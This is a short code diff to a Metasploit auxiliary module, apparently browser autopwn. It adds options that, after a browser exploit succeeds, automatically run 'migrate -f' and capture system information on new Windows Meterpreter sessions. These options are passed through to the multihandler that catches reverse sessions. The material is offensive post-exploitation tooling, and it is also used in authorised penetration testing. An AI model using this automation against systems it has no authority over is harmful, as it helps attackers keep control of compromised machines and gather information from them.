@@ -65,6 +65,11 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		register_advanced_options([
+			# We know that most of these exploits will crash the browser, so
+			# set the default to run migrate right away if possible.
+			OptString.new('InitialAutoRunScript', [false, "An initial script to run on session created (before AutoRunScript)",  'migrate -f']),
+			OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
+			OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
 			OptString.new('MATCH', [false,
 				'Only attempt to use exploits whose name matches this regex'
 			]),
@@ -402,6 +407,12 @@ class Metasploit3 < Msf::Auxiliary
 				multihandler.datastore['LHOST'] = @lhost
 				multihandler.datastore['ExitOnSession'] = false
 				multihandler.datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
+				# XXX: Revisit this when we have meterpreter working on more than just windows
+				if (lport == @win_lport)
+					multihandler.datastore['AutoRunScript'] = datastore['AutoRunScript']
+					multihandler.datastore['AutoSystemInfo'] = datastore['AutoSystemInfo']
+					multihandler.datastore['InitialAutoRunScript'] = datastore['InitialAutoRunScript']
+				end
 				multihandler.exploit_simple(
 					'LocalInput'     => self.user_input,
 					'LocalOutput'    => self.user_output,
